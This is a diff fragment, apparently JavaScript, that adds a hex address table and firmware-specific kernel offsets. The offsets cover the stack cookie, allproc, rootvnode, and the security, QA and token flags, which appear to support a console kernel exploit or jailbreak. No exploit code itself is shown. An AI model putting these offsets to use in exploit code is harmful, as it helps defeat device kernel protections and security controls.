+	0x278: 0x0001D720,
+	0x279: 0x0001BBB0,
+	0x27A: 0x0001BB70,
+	0x27B: 0x0001BC70,
+	0x27C: 0x0001B8B0,
+	0x27D: 0x0001C620,
+	0x27E: 0x0001B9B0,
+	0x27F: 0x0001D840,
+	0x280: 0x0001C9A0,
+	0x281: 0x0001B4D0,
+	0x282: 0x0001BD50,
+	0x283: 0x0001CB30,
+	0x286: 0x0001D470,
+	0x287: 0x0001C640,
+	0x288: 0x0001AF70,
+	0x289: 0x0001D210,
+	0x28C: 0x0001B010,
+	0x28D: 0x0001B7F0,
+	0x28E: 0x0001B590,
+	0x28F: 0x0001D030,
+	0x290: 0x0001CC70,
+	0x291: 0x0001BCD0,
+	0x292: 0x0001B430,
+	0x293: 0x0001B950,
+	0x294: 0x0001D700,
+	0x295: 0x0001CEB0,
+	0x296: 0x0001B3B0,
+	0x297: 0x0001C200,
+	0x298: 0x0001B290,
+	0x299: 0x0001CDB0,
+	0x29A: 0x0001C1E0,
+	0x29B: 0x0001B170,
+	0x29C: 0x0001C8C0,
+	0x29D: 0x0001D350,
+	0x29E: 0x0001D250,
+	0x29F: 0x0001CCB0,
+	0x2A0: 0x0001D110,
+	0x2A1: 0x0001D2B0,
+	0x2A2: 0x0001D130,
+	0x2A3: 0x0001C180,
+	0x2A4: 0x0001CA70,
+	0x2A5: 0x0001C560,
+	0x2A6: 0x0001BFA0,
+	0x2A7: 0x0001B570,
+	0x2A8: 0x0001C2A0,
+	0x2A9: 0x0001CAB0,
+	0x2AA: 0x0001B1F0,
+	0x2AB: 0x0001D5D0,
+	0x2AC: 0x0001BD70,
+	0x2AD: 0x0001AFB0,
+	0x2AE: 0x0001AE00,
+	0x2AF: 0x0001B410,
+	0x2B0: 0x0001BE10,
+	0x2B1: 0x0001D550,
+	0x2B2: 0x0001C7E0,
+	0x2B3: 0x0001C720,
+	0x2B4: 0x0001CEF0,
+	0x2B5: 0x0001C400,
+	0x2B6: 0x0001C260,
+	0x2C1: 0x0001B250,
+	0x2C9: 0x0001D530,
+	0x2CC: 0x0001BAB0,
+	0x2CD: 0x0001C5C0,
+	0x2CE: 0x0001BB90,
+	0x2CF: 0x0001ADE0,
+	0x2D0: 0x0001CE90,
+	0x2D1: 0x0001CF50,
+	0x2D2: 0x0001B030,
+	0x2D5: 0x0001C6C0,
+	0x2DC: 0x0001CC30,
+	0x2DD: 0x0001B3F0,
 };
+
+// Firmware-specific kernel offsets from the validated SDK family table.
+// Text-relative except for the two invariant syscall-stack frame offsets.
+const OFFSET_KERNEL_STACK_COOKIE                = 0x00000930;
+const OFFSET_KERNEL_STACK_SYS_SCHED_YIELD_RET   = 0x00000808;
+const OFFSET_KERNEL_DATA                        = 0x00D50000;
+const OFFSET_KERNEL_SYS_SCHED_YIELD_RET         = 0x0063AC62;
+const OFFSET_KERNEL_ALLPROC                     = 0x035D5E00;
+const OFFSET_KERNEL_SECURITY_FLAGS              = 0x01AD3064;
+const OFFSET_KERNEL_TARGETID                    = 0x01AD306D;
+const OFFSET_KERNEL_QA_FLAGS                    = 0x01AD3088;
+const OFFSET_KERNEL_UTOKEN_FLAGS                = 0x01AD30F0;
+const OFFSET_KERNEL_ROOTVNODE                   = 0x03E27510;
